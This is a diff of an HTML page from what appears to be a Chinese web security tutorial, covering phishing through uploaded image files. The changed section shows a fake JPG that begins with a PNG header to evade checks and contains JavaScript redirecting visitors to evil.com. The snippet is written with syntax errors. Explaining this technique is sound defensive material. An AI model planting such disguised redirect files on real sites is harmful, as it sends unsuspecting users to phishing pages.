@@ -275,27 +275,26 @@ P3P头运行跨域访问隐私数据
 </li>
 <li><p>利用上传文件钓鱼<br>  如果是普通的钓鱼可能容易被发现URL的不一致。那么可以在正规网站上传图片，图片内容可以导向钓鱼网站，这样用户就会以为打开的只是一个正常图片。比如：  </p>
 <ol>
-<li><p>上传了一张图片，地址为：<br>http://…/uploads/xxx.jpg</p>
-</li>
-<li><p>而图片内容是：  </p>
-<p>png(正常的图片开头，绕过某些检测）    </p>
-<script language="javascript:">  
-var c = window.location.tostring();
-if(c.indexof("?") != -1 {
-var i = c.split("?")[1];
-if(i.split("_")[0]==1) {
- location.href = 'http://evil.com/xxx.asp?id=' + i.split("_")[1];
-else {
- location.href = 'http://evil.com/xxx.asp?id=' + i.split("_")[1];
-}
-}
-</script>
-
+<li><p>上传了一张图片，地址为：http://…/uploads/xxx.jpg</p>
+<p><img src="https://pic.downk.cc/item/5e35800a2fb38b8c3c3fc128.jpg" alt></p>
 </li>
 </ol>
 </li>
 </ul>
+<pre><code>2. 而图片内容是：  
 
+png(正常的图片开头，绕过某些检测）    
+&lt;script language=&quot;javascript:&quot;&gt;  
+var c = window.location.tostring();
+if(c.indexof(&quot;?&quot;) != -1 {
+var i = c.split(&quot;?&quot;)[1];
+if(i.split(&quot;_&quot;)[0]==1) {
+    location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1];
+else {
+    location.href = &apos;http://evil.com/xxx.asp?id=&apos; + i.split(&quot;_&quot;)[1];
+}
+}
+&lt;/script&gt;</code></pre>
     </div>
     
     <div class="reward" ontouchstart>
